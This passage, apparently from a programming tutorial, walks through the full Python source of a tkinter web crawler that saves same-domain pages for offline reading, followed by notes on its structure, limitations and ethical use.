# Special rules for Wikipedia URLs    # Standard validation for other domainsLink RewritingLocalizes links using relative paths for offline use:local_path = self.clean_filename(absolute_url)relative_path = os.path.relpath(local_path, os.path.dirname(filename))anchor['href'] = relative_pathThreading for Responsive GUIThe crawling process runs in a separate thread to keep the GUI responsive:threading.Thread(target=crawl_thread, daemon=True).start()Full CodeGithub Repository:  Web Scraper Toolimport tkinter as tkfrom tkinter import ttk, filedialog, messageboximport threadingimport sysimport osimport requestsfrom bs4 import BeautifulSoupfrom urllib.parse import urljoin, urlparseimport timeimport reimport randomclass WebsiteCrawler:    def __init__(self, base_url, output_dir=\"downloaded_site\", max_depth=3, rate_limit=1):        self.base_url = base_url        self.domain = urlparse(base_url).netloc        self.output_dir = output_dir        self.visited_urls = set()        self.rate_limit = rate_limit        self.max_depth = max_depth        self.stop_requested = False        self.user_agents = [            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\",            \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15\",            \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\",        ]        # Create output directory if it doesn't exist        os.makedirs(output_dir, exist_ok=True)    def stop(self):        self.stop_requested = True        print(\"\\n[INFO] Stop requested. Finishing current page...\")    def is_valid_url(self, url):        try:            parsed = urlparse(url)            # Skip any image files or unsupported formats            invalid_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.svg', '.webp', '.bmp', '.ico', '.pdf', '.zip', '.doc', '.docx')            if url.lower().endswith(invalid_extensions):                print(f\"[SKIP] Invalid file type: {url}\")                return False            # Skip special pages (e.g., Wikipedia)            skip_patterns = [                '/wiki/Wikipedia:', '/wiki/File:', '/wiki/Help:', '/wiki/Special:', '/wiki/Talk:',                '/wiki/User:', '/wiki/Template:', '/wiki/Category:', '/wiki/Portal:',                'action=', 'oldid=', 'diff=', 'printable=', 'mobileaction='            ]            if any(pattern in url for pattern in skip_patterns):                print(f\"[SKIP] Special page: {url}\")                return False            # Ensure the URL belongs to the same domain            is_valid = (                parsed.netloc == self.domain and                parsed.scheme in ['http', 'https']            )            if not is_valid:                print(f\"[SKIP] URL rejected: {url}\")            return is_valid        except Exception as e:            print(f\"[ERROR] Error parsing URL {url}: {str(e)}\")            return False    def clean_filename(self, url):        # Remove the domain and scheme        parsed = urlparse(url)        path = parsed.path.strip('/')        if not path.endswith('.html'):            path += '.html'        # Clean the filename        filename = re.sub(r'[&lt;&gt;:\"/\\\\|?*]', '_', path)        filepath = os.path.join(self.output_dir, filename)        # Create subdirectories if needed        os.makedirs(os.path.dirname(filepath), exist_ok=True)        return filepath    def download_page(self, url):        headers = {\"User-Agent\": random.choice(self.user_agents)}        try:            response = requests.get(url, headers=headers, timeout=10)            response.raise_for_status()            print(f\"[SUCCESS] Downloaded: {url}\")            return response.text        except requests.RequestException as e:            print(f\"[ERROR] Failed to download {url}: {str(e)}\")            return None    def save_page(self, content, url):        try:            filepath = self.clean_filename(url)            with open(filepath, 'w', encoding='utf-8') as f:                f.write(content)            print(f\"[SUCCESS] Saved: {filepath}\")        except Exception as e:            print(f\"[ERROR] Error saving {url}: {str(e)}\")    def extract_links(self, content, url):        soup = BeautifulSoup(content, 'html.parser')        links = set()        print(f\"\\n[INFO] Extracting links from {url}\")        link_count = 0        for anchor in soup.find_all('a', href=True):            link = urljoin(url, anchor['href'])            if self.is_valid_url(link):                links.add(link)                link_count += 1        print(f\"[INFO] Found {link_count} valid links on this page\")        return links    def crawl(self):        queue = [(self.base_url, 0)]        pages_processed = 0        start_time = time.time()        print(f\"\\n[INFO] Starting crawl of {self.base_url}\")        print(f\"[INFO] Maximum depth: {self.max_depth}\")        while queue and not self.stop_requested:            url, depth = queue.pop(0)            if url in self.visited_urls or depth &gt;= self.max_depth:                continue            pages_processed += 1            print(f\"\\n[INFO] Processing page {pages_processed} at depth {depth}/{self.max_depth}\")            print(f\"[INFO] URL: {url}\")            print(f\"[INFO] Queue size: {len(queue)}\")            self.visited_urls.add(url)            # Download the page            content = self.download_page(url)            if content:                # Save the page                self.save_page(content, url)                # Extract and add new links to the queue                if depth &lt; self.max_depth - 1:                    new_links = self.extract_links(content, url)                    queue.extend([(link, depth + 1) for link in new_links if link not in self.visited_urls])                # Rate limiting                if queue and not self.stop_requested:                    print(f\"[INFO] Waiting {self.rate_limit} seconds before next page...\")                    time.sleep(self.rate_limit)        elapsed_time = time.time() - start_time        print(f\"\\n[INFO] Crawling completed!\")        if self.stop_requested:            print(\"[INFO] Crawling was stopped by user\")        print(f\"[INFO] Total pages processed: {pages_processed}\")        print(f\"[INFO] Total unique URLs visited: {len(self.visited_urls)}\")        print(f\"[INFO] Total time: {elapsed_time:.2f} seconds\")class WebCrawlerGUI:    def __init__(self, root):        self.root = root        self.root.title(\"Web Crawler\")        self.root.geometry(\"600x500\")        self.crawler = None        # Create main frame        main_frame = ttk.Frame(root, padding=\"10\")        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))        # URL input        ttk.Label(main_frame, text=\"URL to crawl:\").grid(row=0, column=0, sticky=tk.W, pady=5)        self.url_var = tk.StringVar()        self.url_entry = ttk.Entry(main_frame, textvariable=self.url_var, width=50)        self.url_entry.grid(row=0, column=1, columnspan=2, sticky=(tk.W, tk.E), pady=5)        # Output directory        ttk.Label(main_frame, text=\"Output directory:\").grid(row=1, column=0, sticky=tk.W, pady=5)        self.output_var = tk.StringVar(value=os.path.join(os.getcwd(), \"downloaded_site\"))        self.output_entry = ttk.Entry(main_frame, textvariable=self.output_var, width=50)        self.output_entry.grid(row=1, column=1, sticky=(tk.W, tk.E), pady=5)        ttk.Button(main_frame, text=\"Browse\", command=self.browse_output).grid(row=1, column=2, sticky=tk.W, pady=5, padx=5)        # Depth input        ttk.Label(main_frame, text=\"Maximum depth:\").grid(row=2, column=0, sticky=tk.W, pady=5)        self.depth_var = tk.StringVar(value=\"3\")        depth_entry = ttk.Entry(main_frame, textvariable=self.depth_var, width=10)        depth_entry.grid(row=2, column=1, sticky=tk.W, pady=5)        # Rate limit input        ttk.Label(main_frame, text=\"Rate limit (seconds):\").grid(row=3, column=0, sticky=tk.W, pady=5)        self.rate_limit_var = tk.StringVar(value=\"1\")        rate_limit_entry = ttk.Entry(main_frame, textvariable=self.rate_limit_var, width=10)        rate_limit_entry.grid(row=3, column=1, sticky=tk.W, pady=5)        # Progress frame        progress_frame = ttk.LabelFrame(main_frame, text=\"Progress\", padding=\"5\")        progress_frame.grid(row=4, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=10)        # Progress bar        self.progress_var = tk.StringVar(value=\"Ready\")        ttk.Label(progress_frame, textvariable=self.progress_var).grid(row=0, column=0, sticky=tk.W)        # Log text area        self.log_text = tk.Text(main_frame, height=15, width=60, wrap=tk.WORD)        self.log_text.grid(row=5, column=0, columnspan=3, sticky=(tk.W, tk.E), pady=5)        # Scrollbar for log        scrollbar = ttk.Scrollbar(main_frame, orient=tk.VERTICAL, command=self.log_text.yview)        scrollbar.grid(row=5, column=3, sticky=(tk.N, tk.S))        self.log_text.configure(yscrollcommand=scrollbar.set)        # Buttons frame        button_frame = ttk.Frame(main_frame)        button_frame.grid(row=6, column=0, columnspan=3, pady=10)        # Start button        self.start_button = ttk.Button(button_frame, text=\"Start Crawling\", command=self.start_crawling)        self.start_button.pack(side=tk.LEFT, padx=5)        # Stop button (initially disabled)        self.stop_button = ttk.Button(button_frame, text=\"Stop\", command=self.stop_crawling, state='disabled')        self.stop_button.pack(side=tk.LEFT, padx=5)        # Configure grid weights        main_frame.columnconfigure(1, weight=1)        # Redirect stdout to our log        sys.stdout = self    def write(self, text):        timestamp = time.strftime(\"%Y-%m-%d %H:%M:%S\")        self.log_text.insert(tk.END, f\"[{timestamp}] {text}\")        self.log_text.see(tk.END)        self.root.update_idletasks()    def flush(self):        pass    def browse_output(self):        directory = filedialog.askdirectory(initialdir=self.output_var.get())        if directory:            self.output_var.set(directory)    def stop_crawling(self):        self.stop_button.configure(state='disabled')        self.progress_var.set(\"Stopping...\")        if self.crawler:            self.crawler.stop()    def start_crawling(self):        # Validate inputs        url = self.url_var.get().strip()        output_dir = self.output_var.get().strip()        try:            depth = int(self.depth_var.get())            if depth &lt; 1:                raise ValueError(\"Depth must be at least 1\")        except ValueError as e:            messagebox.showerror(\"Error\", \"Invalid depth value. Please enter a positive number.\")            return        try:            rate_limit = float(self.rate_limit_var.get())            if rate_limit &lt; 0:                raise ValueError(\"Rate limit must be non-negative\")        except ValueError as e:            messagebox.showerror(\"Error\", \"Invalid rate limit value. Please enter a non-negative number.\")            return        if not url:            messagebox.showerror(\"Error\", \"Please enter a URL\")            return        if not url.startswith(('http://', 'https://')):            messagebox.showerror(\"Error\", \"URL must start with http:// or https://\")            return        # Disable inputs while crawling        self.start_button.configure(state='disabled')        self.url_entry.configure(state='disabled')        self.output_entry.configure(state='disabled')        self.progress_var.set(\"Crawling...\")        # Clear log        self.log_text.delete(1.0, tk.END)        # Start crawling in a separate thread        def crawl_thread():            try:                self.crawler = WebsiteCrawler(url, output_dir, depth, rate_limit)                self.stop_button.configure(state='normal')  # Enable stop button                self.crawler.crawl()                if self.crawler.stop_requested:                    self.root.after(0, self.crawling_finished, True, \"Crawling stopped by user\")                else:                    self.root.after(0, self.crawling_finished, True)            except Exception as e:                self.root.after(0, self.crawling_finished, False, str(e))        threading.Thread(target=crawl_thread, daemon=True).start()    def crawling_finished(self, success, error_message=None):        # Re-enable inputs        self.start_button.configure(state='normal')        self.url_entry.configure(state='normal')        self.output_entry.configure(state='normal')        # Disable stop button        self.stop_button.configure(state='disabled')        if success:            if error_message and \"stopped by user\" in error_message:                self.progress_var.set(\"Crawling stopped\")                messagebox.showinfo(\"Stopped\", \"Website crawling was stopped by user\")            else:                self.progress_var.set(\"Crawling completed!\")                messagebox.showinfo(\"Success\", \"Website crawling completed successfully!\")        else:            self.progress_var.set(\"Error occurred!\")            messagebox.showerror(\"Error\", f\"An error occurred while crawling:\\n{error_message}\")def main():    root = tk.Tk()    app = WebCrawlerGUI(root)    root.mainloop()if __name__ == \"__main__\":    main()Code StructureKey Components  WebsiteCrawler Class: Handles the core crawling logic, including URL validation, content downloading, and link extraction.  WebCrawlerGUI Class: Manages the GUI components and threading for a responsive interface.  Main Function: Initializes the GUI and starts the application.Method Overview    A [Start Crawling] --&gt; B {Validate Inputs}    B --&gt; |Valid| C [Initialize Crawler]    C --&gt; D [Crawl Base URL]    D --&gt; E [Process Queue]    E --&gt; F [Download Page]    F --&gt; G [Save Content]    G --&gt; H [Extract Links]    H --&gt; I [Add to Queue]    I --&gt; J {More Pages?}    J --&gt; |Yes| E    J --&gt; |No| K [Finish]OutputLimitations  JavaScript Content: Cannot render or scrape JavaScript-generated content.  Dynamic Websites: May miss content loaded asynchronously.  Authentication: Doesn’t handle password-protected pages.  Robots.txt: Doesn’t respect website’s robots.txt policies.  Large Sites: Not optimized for very large websites (&gt;1000 pages).Future Enhancements  Add support for sitemap.xml parsing.  Implement concurrent requests with thread pooling.  Add CSS/JavaScript file downloading.  Create sitemap visualization.  Add proxy support for distributed crawling.  Respect robots.txt rules.  Add support for handling cookies and sessions.  Implement a retry mechanism for failed requests.Ethical Considerations  Always check the website’s Terms of Service before scraping.  Add robots.txt checking (currently not implemented).  Implement rate limiting to avoid server overload.  Consider adding Referrer-Policy and User-Agent headers.  Never scrape personal or sensitive information.  Use the tool responsibly and for educational purposes only."
  }
  
]

